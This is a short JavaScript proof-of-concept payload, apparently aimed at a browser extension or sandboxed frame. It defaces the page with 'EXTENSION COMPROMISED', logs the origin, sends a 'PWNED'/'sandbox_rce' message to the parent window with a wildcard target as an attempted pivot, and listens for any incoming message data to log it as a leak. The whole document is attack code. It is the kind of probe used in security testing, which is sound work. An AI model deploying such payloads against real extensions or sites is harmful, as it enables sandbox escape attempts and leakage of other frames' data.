// STRONG PoC payload
document.body.innerHTML = "<h1>🔥 EXTENSION COMPROMISED</h1>";

console.log("Origin:", location.origin);

// try pivot
window.parent.postMessage({
    type: "PWNED",
    data: "sandbox_rce"
}, "*");

// listen for data
window.addEventListener("message", e => {
    console.log("LEAK:", e.data);
});
